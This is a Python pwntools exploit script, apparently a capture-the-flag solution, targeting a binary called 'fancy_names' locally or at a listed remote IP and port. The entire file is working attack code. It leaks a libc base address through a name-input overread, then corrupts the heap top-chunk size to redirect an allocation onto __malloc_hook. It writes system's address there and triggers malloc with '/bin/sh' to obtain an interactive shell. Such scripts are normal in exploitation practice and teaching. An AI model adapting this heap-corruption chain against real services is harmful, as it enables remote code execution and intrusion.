from pwn import *
from time import sleep

'''
			b* menu+0x361
			b* menu+178
			b* menu+220
			b* menu+1103
			b* fflush+154
'''
def debug():
	if local<2:
		gdb.attach(p,'''
			b* main+352
			b* main+357
			b* exit
			c 
			p $rdi
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./fancy_names")
libc=ELF("./libc.so.6")
nc="nc 94.237.53.3 40676"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote(host,port)
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass

############### main exploit    ###############


def leak(payload,cond=True):
	p.sendline("1")
	p.recvuntil("Insert new name (minimum 5 chars): ")
	p.send(payload)
	p.recvuntil("xx")
	l=u64(p.recv(6)+b"\x00"*2)
	if cond:
		p.sendline("n")
	else: 
		p.sendline("y")
	return l

def malloc(size,payload,cond=True):

	p.sendline("1")

	#p.recvuntil("Stat points (max ")
	p.sendline(str(int(size)))
	sleep(0.1)
	if cond:
		p.send(payload)
		sleep(0.5)


'''
base=leak(b"wisely\x00"+b"a"*7+b"xx")
print("base : "+hex(base))
'''
libc.address=leak(b"a"*54+b"xx")-0x64F44
print("lib: "+hex(libc.address))


p.sendline("2")
sleep(1)
p.sendline("7")
p.recvuntil("Invalid option!")

p.sendline("1")
#sleep(0.2)
#p.recvuntil("Insert new name (minimum 5 chars): ")
p.sendline(p64(libc.symbols["__malloc_hook"]+0xff000000000000))
p.recvuntil("Are you sure you want to use the name")
p.sendline("y")

p.sendline("3")
sleep(0.5)
malloc(96,b"a"*24+p64(0xffffffffffffffff))
#debug()


malloc(96,p64(libc.symbols["system"]))

#debug()
malloc(next(libc.search(b"/bin/sh\x00")),"aaa",False)
'''
malloc(24,b"a"*24+p64(0xffffffffffffffff))


malloc(0xfffffffffffffe80-0x180,b"b"*4,False)

malloc(0x30,b"\x00"*8+p64(libc.symbols["__malloc_hook"]))
sleep(0.1)
debug()

malloc(0x60,p64(libc.symbols["system"]))
#malloc(0xffffffffffffff00,b"b"*24)
'''
p.interactive()